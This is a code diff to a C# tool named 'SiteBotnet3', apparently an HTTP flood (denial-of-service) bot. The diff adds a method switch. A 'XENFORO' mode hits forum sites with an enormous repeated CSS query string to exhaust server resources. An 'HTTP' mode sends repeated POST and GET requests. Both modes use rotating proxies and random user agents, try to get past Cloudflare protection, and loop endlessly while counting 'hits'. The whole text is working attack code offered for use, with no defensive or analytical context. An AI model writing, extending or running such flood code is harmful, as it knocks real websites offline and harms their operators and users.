@@ -12,6 +12,7 @@ namespace SiteBotnet3
         private string ProxyType;
         private List<string> ProxyList;
 
+        private string Method;
         private string Target;
         private int Threads;
 
@@ -21,6 +22,8 @@ namespace SiteBotnet3
         private string ThreadName;
 
         public Requests(string Name) { ThreadName = Name; }
+
+        public void SetMethod(string Method) { this.Method = Method; }
 
         public void SetTarget(string Target) { this.Target = Target; }
 
@@ -46,7 +49,6 @@ namespace SiteBotnet3
                     req.UserAgent = Http.RandomUserAgent();
                     req.IgnoreProtocolErrors = true;
                     req.Cookies = new CookieStorage();
-                    req.KeepAlive = true;
 
                     if (ProxyType == "HTTP")
                     {
@@ -71,51 +73,31 @@ namespace SiteBotnet3
                         req.Proxy = null;
                         req.KeepAlive = true;
                     }
+
                     Thread.Sleep(100);
+                    Uri TargetUri = new Uri(Target);
+                    HttpResponse respo = null;
 
-                    HttpResponse respo = req.Post(Target);
-                    if (respo.IsCloudflared()) respo = req.GetThroughCloudflare(Target);
-
-                    using (HttpRequest req1 = new HttpRequest())
+                    if (Method == "XENFORO")
                     {
-                        req1.UserAgent = Http.RandomUserAgent();
-                        req1.IgnoreProtocolErrors = true;
-                        req1.Cookies = new CookieStorage();
-
-                        if (ProxyType == "HTTP")
-                        {
-                            string proxy = ProxyList[new Random().Next(ProxyList.Count)];
-                            req1.Proxy = new HttpProxyClient(proxy);
-                            Console.WriteLine(ThreadName + " Using HTTP proxy : " + proxy);
-                        }
-                        else if (ProxyType == "SOCKS4")
-                        {
-                            string proxy = ProxyList[new Random().Next(ProxyList.Count)];
-                            req1.Proxy = new Socks4ProxyClient(proxy);
-                            Console.WriteLine(ThreadName + " Using SOCKS4 proxy : " + proxy);
-                        }
-                        else if (ProxyType == "SOCKS4")
-                        {
-                            string proxy = ProxyList[new Random().Next(ProxyList.Count)];
-                            req1.Proxy = new Socks5ProxyClient(proxy);
-                            Console.WriteLine(ThreadName + " Using SOCKS5 proxy : " + proxy);
-                        }
-                        else if (ProxyType == "NONE")
-                        {
-                            req1.Proxy = null;
-                            req1.KeepAlive = true;
-                        }
-                        Thread.Sleep(100);
-
-                        HttpResponse respo1 = req1.Get(Target);
-                        if (respo1.IsCloudflared()) respo1 = req1.GetThroughCloudflare(Target);
-
-                        Hits += 1;
-                        Console.WriteLine(ThreadName + " (" + Hits + " Hits) SUCCESS! | Target : " + Target + " | Threads : " + Threads);
-                        new Ping().Send(new Uri(Target).Host);
-
-                        Start(false);
+                        string xenForo = "?css=xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic";
+                        respo = req.Get(TargetUri + xenForo);
+                        if (respo.IsCloudflared()) respo = req.GetThroughCloudflare(TargetUri + xenForo);
                     }
+                    else if (Method == "HTTP")
+                    {
+                        respo = req.Post(TargetUri);
+                        if (respo.IsCloudflared()) respo = req.GetThroughCloudflare(TargetUri);
+
+                        respo = req.Get(TargetUri);
+                        if (respo.IsCloudflared()) respo = req.GetThroughCloudflare(TargetUri);
+                    }
+
+                    new Ping().Send(TargetUri.Host);
+
+                    Hits += 1;
+                    Console.WriteLine(ThreadName + " (" + Hits + " Hits) SUCCESS! | Target : " + Target + " | Threads : " + Threads);
+                    Start(false);
                 }
             }
             catch { goto request; }
